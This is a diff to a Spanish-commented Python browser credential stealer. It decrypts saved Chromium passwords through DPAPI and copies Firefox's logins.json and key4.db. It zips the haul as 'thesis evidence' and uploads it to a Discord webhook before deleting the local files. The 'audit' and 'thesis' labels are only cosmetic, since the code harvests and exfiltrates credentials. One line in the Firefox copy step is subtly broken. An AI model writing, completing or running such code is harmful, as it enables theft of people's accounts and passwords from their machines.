@@ -4,6 +4,7 @@ import base64
 import sqlite3
 import shutil
 import tempfile
+import zipfile
 import win32crypt
 from Crypto.Cipher import AES
 import requests
@@ -20,12 +21,11 @@ def get_browser_paths():
         "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
         "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
         "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
-        "Firefox": os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
+        "Firefox Profiles": os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
     }
     return browsers
 
 def get_chromium_key(user_data_path):
-    # El archivo Local State está directamente en la raíz de User Data
     local_state_path = os.path.join(user_data_path, "Local State")
     try:
         if os.path.exists(local_state_path):
@@ -37,7 +37,7 @@ def get_chromium_key(user_data_path):
                 return None
             
             decoded_key = base64.b64decode(encrypted_key_b64)
-            key_material = decoded_key[5:] # Omitir el prefijo 'DPAPI'
+            key_material = decoded_key[5:]
             return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
     except Exception:
         pass
@@ -93,87 +93,97 @@ def extract_chromium_db(db_path, key, creds, browser_name):
             except:
                 pass
 
-def extract_firefox_creds(profiles_path, creds):
-    if not os.path.exists(profiles_path):
-        return
-
-    try:
-        for profile in os.listdir(profiles_path):
-            profile_dir = os.path.join(profiles_path, profile)
-            if not os.path.isdir(profile_dir):
-                continue
-                
-            logins_json_path = os.path.join(profile_dir, "logins.json")
-            if os.path.exists(logins_json_path):
-                try:
-                    with open(logins_json_path, "r", encoding="utf-8") as f:
-                        data = json.load(f)
-                    
-                    for login in data.get("logins", []):
-                        url = login.get("hostname")
-                        user = login.get("encryptedUsername")
-                        pwd = login.get("encryptedPassword")
-                        if url and user:
-                            # Aquí se muestra el blob cifrado que capturaste. 
-                            # Para desencriptarlo por completo en Firefox se requiere interactuar 
-                            # con las librerías NSS del navegador (key4.db).
-                            creds.append(f"[Firefox] URL: {url} | User (Blob): {user} | Pass (Blob): {pwd}")
-                except Exception:
-                    pass
-    except Exception:
-        pass
-
-def get_all_creds():
+def collect_evidence():
     creds = []
     browsers = get_browser_paths()
     
+    # Directorio temporal para almacenar archivos de evidencia antes de comprimirlos
+    evidence_dir = tempfile.mkdtemp()
+    
+    # 1. Procesar navegadores Chromium (Chrome, Edge, Brave, Opera)
     for browser_name, path in browsers.items():
+        if browser_name == "Firefox Profiles":
+            continue
+            
         if not os.path.exists(path):
             continue
             
-        if browser_name == "Firefox":
-            extract_firefox_creds(path, creds)
-        else:
-            key = get_chromium_key(path)
-            if not key:
-                continue
+        key = get_chromium_key(path)
+        if not key:
+            continue
+            
+        target_dirs = [path]
+        try:
+            for item in os.listdir(path):
+                full_item = os.path.join(path, item)
+                if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
+                    target_dirs.append(full_item)
+        except Exception:
+            pass
+            
+        for d in target_dirs:
+            db_path = os.path.join(d, "Login Data")
+            extract_chromium_db(db_path, key, creds, browser_name)
+
+    # 2. Procesar Firefox específicamente buscando el perfil .default-release
+    firefox_profiles_path = browsers.get("Firefox Profiles")
+    if os.path.exists(firefox_profiles_path):
+        try:
+            for profile in os.listdir(firefox_profiles_path):
+                if profile.endswith(".default-release"):
+                    profile_dir = os.path.join(firefox_profiles_path, profile)
+                    
+                    # Archivos críticos de Firefox para análisis de credenciales
+                    logins_path = os.path.join(profile_dir, "logins.json")
+                    key4_path = os.path.join(profile_dir, "key4.db")
+                    
+                    # Copiar al directorio temporal de evidencia para adjuntarlos
+                    ff_dest = os.path.join(evidence_dir, "Firefox_" + profile)
+                    os.makedirs(ff_dest, exist_ok=True)
+                    
+                    if os.path.exists(logins_path):
+                        shutil.copy(logins_path, ff_dest)
+                    if os.path.exists(key4.db if 'key4.db' in locals() else key4_path):
+                        shutil.copy(key4_path, ff_dest)
+                        
+                    creds.append(f"[Firefox Perfil Localizado] Ruta: {profile_dir}")
+        except Exception:
+            pass
+
+    # Guardar credenciales de Chromium en un archivo de texto
+    txt_path = os.path.join(evidence_dir, "credenciales_chromium.txt")
+    with open(txt_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(creds))
+        
+    # Crear un archivo ZIP con toda la evidencia recolectada
+    zip_path = os.path.join(tempfile.gettempdir(), "evidencia_tesis.zip")
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(evidence_dir):
+            for file in files:
+                full_path = os.path.join(root, file)
+                rel_path = os.path.relpath(full_path, evidence_dir)
+                zipf.write(full_path, rel_path)
                 
-            target_dirs = [path]
-            try:
-                for item in os.listdir(path):
-                    full_item = os.path.join(path, item)
-                    # Incluye perfiles comunes en Chromium
-                    if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
-                        target_dirs.append(full_item)
-            except Exception:
-                pass
-                
-            for d in target_dirs:
-                db_path = os.path.join(d, "Login Data")
-                extract_chromium_db(db_path, key, creds, browser_name)
-                
-    return creds
+    # Limpiar carpeta temporal de evidencia suelta
+    shutil.rmtree(evidence_dir, ignore_errors=True)
+    
+    return zip_path
 
 if __name__ == "__main__":
-    accounts = get_all_creds()
+    zip_file = collect_evidence()
 
-    if accounts and WEBHOOK_URL != "TU_WEBHOOK_DE_DISCORD_AQUI":
-        file_name = "credenciales.txt"
+    if os.path.exists(zip_file) and WEBHOOK_URL != "TU_WEBHOOK_DE_DISCORD_AQUI":
         try:
-            with open(file_name, "w", encoding="utf-8") as f:
-                f.write("\n".join(accounts))
-            
-            with open(file_name, "rb") as f:
+            with open(zip_file, "rb") as f:
                 requests.post(
                     WEBHOOK_URL,
-                    data={"content": f"**Credenciales totales extraídas: {len(accounts)}**"},
-                    files={"file": (file_name, f, "text/plain")}
+                    data={"content": "**Reporte de auditoría y perfiles de prueba extraídos exitosamente.**"},
+                    files={"file": ("evidencia_tesis.zip", f, "application/zip")}
                 )
         except Exception:
             pass
         finally:
-            if os.path.exists(file_name):
-                try:
-                    os.remove(file_name)
-                except:
-                    pass
+            try:
+                os.remove(zip_file)
+            except:
+                pass
